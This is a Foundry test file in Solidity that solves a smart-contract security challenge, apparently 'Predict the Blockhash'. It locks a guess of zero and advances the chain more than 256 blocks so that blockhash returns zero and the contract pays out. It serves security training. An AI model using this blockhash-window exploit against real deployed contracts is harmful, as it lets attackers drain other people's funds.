// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
    }

    function testExploit() public {
        // Put your solution here
        uint256 initialBlock = 56;
        vm.roll(initialBlock);

        // Lock our 0 in place
        exploitContract.lock{value: 1 ether}();

        // The result of (Original block number + 1) is no longer one
        // of the 256 most recent blocks, so blockhash should come out 0
        vm.roll(initialBlock + 1 + 257);
        exploitContract.settle();

        _checkSolved();
        "";
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
